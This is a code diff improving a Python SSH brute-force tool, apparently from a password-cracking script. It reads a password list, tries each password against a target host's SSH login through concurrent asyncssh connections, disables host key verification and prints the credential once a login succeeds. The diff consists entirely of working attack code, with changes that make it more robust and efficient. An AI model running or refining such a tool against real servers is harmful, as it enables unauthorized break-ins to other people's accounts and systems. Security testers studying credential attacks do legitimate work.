@@ -22,52 +22,75 @@ def get_args():
     return args
 
 
-async def ssh_bruteforce(hostname, username, password, port, found_flag):
-    """Takes password,username,port as input and checks for connection"""
+async def ssh_bruteforce(hostname, username, password, port, found_flag, result_holder):
+    """Takes password, username, port as input and checks for connection"""
+    if found_flag.is_set():
+        return
+    
     try:
-        async with asyncssh.connect(hostname, username=username, password=password, port=port) as conn:
+        async with asyncssh.connect(hostname, username=username, password=password, port=port, known_hosts=None) as conn:
             found_flag.set()
+            result_holder['password'] = password
             print(colored(
                 f"[{port}] [ssh] host:{hostname}  login:{username}  password:{password}", 'green'))
 
+    except asyncssh.PermissionDenied:
+        if not found_flag.is_set():
+            print(f"[Attempt] target {hostname} - login:{username} - password:{password}")
+    
+    except asyncssh.misc.HostKeyNotVerifiable as e:
+        print(colored(f"[!] Host key verification failed: {e}", 'yellow'))
+    
+    except asyncssh.misc.DisconnectError as e:
+        print(colored(f"[!] Disconnected by host: {e}", 'red'))
+    
+    except (asyncio.TimeoutError, OSError) as e:
+        print(colored(f"[!] Connection error: {e}", 'red'))
+    
     except Exception as err:
-        print(
-            f"[Attempt] target {hostname} - login:{username} - password:{password}")
+        if not found_flag.is_set():
+            print(colored(f"[!] Unexpected error with password '{password}': {type(err).__name__} - {err}", 'red'))
 
 
 async def main(hostname, port, username, password_file):
-    """The Main function takes hostname,port, username,password_file Defines concurrency limit and sends taks to ssh_bruteforce function"""
-    tasks = []
+    """Main function - manages concurrent SSH attempts with proper async/await"""
     passwords = []
     found_flag = asyncio.Event()
-    concurrency_limit = 10
-    counter = 0
+    result_holder = {}
+    concurrency_limit = 5
+    
     with open(password_file, 'r') as f:
-        for password in f.readlines():
-            password = password.strip()
-            passwords.append(password)
+        passwords = [password.strip() for password in f.readlines()]
 
-    for password in passwords:
-        if counter >= concurrency_limit:
-            await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
-            tasks = []
-            counter = 0
+    # Create semaphore to limit concurrent connections
+    semaphore = asyncio.Semaphore(concurrency_limit)
 
-        if not found_flag.is_set():
-            tasks.append(asyncio.create_task(ssh_bruteforce(
-            hostname, username, password, port, found_flag)))
+    async def bounded_bruteforce(password):
+        async with semaphore:
+            if not found_flag.is_set():
+                await ssh_bruteforce(hostname, username, password, port, found_flag, result_holder)
 
-            await asyncio.sleep(0.5)
-            counter += 1
+    # Create all tasks
+    tasks = [bounded_bruteforce(password) for password in passwords]
+    
+    # Run all tasks concurrently
+    try:
+        await asyncio.gather(*tasks, return_exceptions=True)
+    except asyncio.CancelledError:
+        pass
 
-    await asyncio.gather(*tasks)
+    if found_flag.is_set():
+        print(colored(f"\n[!] Password found: {result_holder.get('password')}\n", 'green'))
+    else:
+        print(colored("\n[-] Failed to find the correct password.", "red"))
 
-    if not found_flag.is_set():
-        print(colored("\n [-] Failed to find the correct password.", "red"))
 
 if __name__ == "__main__":
 
     arguments = get_args()
+
+    if arguments is None:
+        exit(0)
 
     if not path.exists(arguments.password_file):
         print(colored(
@@ -82,7 +105,7 @@ if __name__ == "__main__":
 
     print(colored(
         f"[*] Port\t: ", "light_red"), end="")
-    print('22' if not arguments.port else arguments.port)
+    print(arguments.port)
 
     print(
         colored(f"[*] password_file\t: ", "light_red"), end="")
